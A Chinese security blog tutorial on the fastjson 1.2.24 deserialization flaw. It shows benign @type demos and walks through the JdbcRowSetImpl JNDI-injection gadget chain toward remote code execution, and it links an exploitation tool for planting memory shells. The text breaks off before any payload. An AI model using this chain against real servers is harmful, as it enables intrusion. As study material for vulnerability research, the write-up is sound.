<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> Hexo</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">Hexo</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  <ul class="ads">
    
        <li>
            <a target="_blank" rel="noopener" href="https://curl.qcloud.com/kvO7hb43">
                <img src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/ten_1.jpg" width="300" alt="云服务器限时秒杀">
            </a>
        </li>
    
        <li>
            <a target="_blank" rel="noopener" href="https://www.vultr.com/?ref=8630075">
                <img src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/vultr.png" width="300" alt="vultr优惠vps">
            </a>
        </li>
    
</ul>
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-fastjson反序列化"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
    >fastjson反序列化</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time datetime="2021-11-09T01:56:28.000Z" itemprop="datePublished">2021-11-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/">-组件漏洞</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="fastjson1-2-24反序列化"><a href="#fastjson1-2-24反序列化" class="headerlink" title="fastjson1.2.24反序列化"></a>fastjson1.2.24反序列化</h1><hr>
<p>在最近的项目中，前辈同事多次对fastjson版本进行反序列化漏洞实现RCE。项目中很多站点使用json字符串提交数据，所以就来学习学习如何探测fastjson版本和如何利用fastjson反序列化导致RCE</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<p>这里就主要分析一下<code>fastjson 1.2.24</code>版本的反序列化漏洞，这个漏洞比较普遍的利用手法就是通过JNDI注入的方式实现RCE，所以是一个不得不分析的JNDI注入实践案例！</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><hr>
<p>fastjson是一个非常流行的库，它可以将数据在<code>JSON</code>和<code>Java Object</code>之间互相转换，我们常说的fastjson<strong>序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象</strong></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
<ul>
<li><p>pom.xml</p>
<p>在pom.xml配置文件中添加fastjson的依赖</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>​      右键点击pom.xml文件,依次选择[maven]–&gt;[Download Sources  and Documentations]下载 配置文件中的依赖项</p>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109152657979.png" alt="image-20211109152657979"></p>
<ul>
<li><p>导入jar包</p>
<p>首先在maven repository中找到下载的jar包地址</p>
<p><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.alibaba/fastjson">下载地址</a></p>
</li>
</ul>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153634446.png" alt="image-20211109153634446"></p>
<p>​      在仓库中找到所要下载的fastjson版本(这里选用fastjson1.2.24)</p>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153743931.png" alt="image-20211109153743931"></p>
<h2 id="序列化-反序列化"><a href="#序列化-反序列化" class="headerlink" title="序列化/反序列化"></a>序列化/反序列化</h2><hr>
<p>为了更清晰的了解Fastjson中JSON字符串和对象的转换，使用IDE简单验证fastjson的序列和反序列</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><hr>
<p>使用JSON.toJsonString()方法将Java对象中的属性及其对应值转换为Json字符串</p>
<p><strong>DEMO</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serialization</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">66</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String json = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>可以看到将java对象使用JSON序列化(JSON.tojsonstring())转换为Json字符串</p>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109155435748.png" alt="image-20211109155435748"></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><hr>
<p>fastjson反序列化自动调用对应对象类中的setxxx()方法，将JSON字符串中的属性及其对应值通过对象类中的setxx()方法实例化</p>
<p>比如JSON字符串 {“age”:66,”username”:”test”}反序列化User类</p>
<p><strong>Demo1</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unSerialization</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">        String json = <span class="string">&quot;&#123;\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;  <span class="comment">//定义json字符串</span></span><br><span class="line">        User user = JSON.parseObject(json,User.class);       <span class="comment">//反序列化User类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lass User&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Username:&quot;</span>+<span class="keyword">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age:&quot;</span>+<span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>可以看到运行结果中输出了setxxx()方法中的字符串。所以在反序列化中JSON.parseObject(json，对象类名.class)自动调用了setxxx()方法，</p>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109161833326.png" alt="image-20211109161833326"></p>
<p>这里的反序列化使用的是<code>parseObject()</code>方法，其实也可以用到<code>parse()</code>方法，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但<code>parseObject()</code> 会将Java对象转为 <code>JSONObject</code>对象，即<code>JSON.toJSON()</code>.</p>
<p>parseObject()和parse()最主要的区别就是前者返回的是<code>JSONObject</code>，而后者会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，返回的是实际类型的对象.当在没有对应类的定义的情况下（没有在<code>@type</code>声明类），通常情况下都会使用<code>JSON.parseObject</code>来获取数据。</p>
<p>由于<code>JSON.parseObject()</code>要反序列化到<strong>对应的对象（比如demo中的User类对象，需要将第二个参数设置为<code>User.class</code>）</strong>才会触发类的<code>setXXX</code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为JVM也不知道是哪个类的对象）。那要怎么处理才能让<code>JSON.parseObject()</code>在调用时，不输入第二个参数也能执行<code>setXXX</code>方法呢？我们使用parse()方法中下@type指定转换的类。</p>
<p><strong>Demo2</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unserialization1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     String json1 = <span class="string">&quot;&#123;\&quot;age\&quot;:123,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;</span><br><span class="line">     String json2 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;反序列化Json1字符串&quot;</span>);</span><br><span class="line">     JSON.parseObject(json1);</span><br><span class="line">     System.out.println(<span class="string">&quot;反序列化json2字符串&quot;</span>);</span><br><span class="line">     JSON.parseObject(json2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Username:&quot;</span>+<span class="keyword">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age:&quot;</span>+<span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>由于json1字符串未指定转换的对象类，没有调用setxxx()方法；而json2字符串使用了@type指定了所要转换的对象类，则调用了setxxx()方法。</p>
<p>可见<code>@type</code>参数的作用就是指定json字符串要反序列化的对象类。就是这个类让我们可以进行漏洞利用</p>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109170634344.png" alt="image-20211109170634344"></p>
<p>相关知识:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig类：</span><br><span class="line">配置反序列化信息</span><br><span class="line"></span><br><span class="line">Autotype：</span><br><span class="line">Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的Class类型。</span><br><span class="line"></span><br><span class="line">AutoType安全校验流程,假设如下场景，</span><br><span class="line">​ 服务端接收到的请求Json串中包含了指定恶意代码Class的@Type，</span><br><span class="line">​ 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码</span><br><span class="line"></span><br><span class="line">AutoType黑名单机制：</span><br><span class="line">在反序列化时，会校验指定的class是否在黑名单中，若在，则抛出异常</span><br><span class="line"></span><br><span class="line">Safemode机制：</span><br><span class="line">配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><hr>
<p>从上面可以看出 ，Fastjson反序列过程中会自动调用@type指定的对象类中的setxxx()方法。所以只要找到一个类，并且他里面的setxxx()方法可以设置自定义的命令执行的属性，就可以造成RCE。</p>
<p>注:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</span><br></pre></td></tr></table></figure>



<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><hr>
<p>com.sun.rowset.jdbcRowSetImpl这个类可以被利用，这个类里面有很多setxxxx()方法，我们需要利用的则是setDataSourceName()和setAutoCommit()方法。 </p>
<p><strong>jdbcRowSetimpl.setDataSourceName</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">               <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">               <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到setDataSourceName()方法调用了父类中的setDataSourceName()方法，传入var1参数。</p>
<p><strong>BaseRowSet.setDataSourceName</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">          dataSource = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         dataSource = name;</span><br><span class="line">      &#125;</span><br><span class="line">      URL = <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>父类中的SetDataSourceName()方法将datasource设置为传入的参数</p>
<p><strong>jdbcRowSetimpl.setAutoCommit</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">         <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>setAutoCommit()方法调用了connect()方法</p>
<p><strong>jdbcRoeSetimpl.connect</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在connect()方法中使用lookup()调用getDataSourceName()方法，获取通过setDataSourceName()方法设置的DataSource，所以Sourcename是可以控制的。我们可以将Sourcename设置加载恶意类，从而利用造成命令执行。</p>
<p><strong>RCE</strong></p>
<p>我们可以将DataSourcename设置为搭建的ldap和RMI服务，这里使用的是JNDIExploit工具</p>
<p>[工具下载地址](<a target="_blank" rel="noopener" href="https://github.com/Jeromeyoung/JNDIExploit-1">Jeromeyoung/JNDIExploit-1: 一款用于JNDI注入利用的工具，大量参考/引用了Rogue JNDI项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。 (github.com)</a>)</p>
<p><strong>Demo</strong></p>
<p>将 datasourcename设置为开启的ldap服务应用类</p>
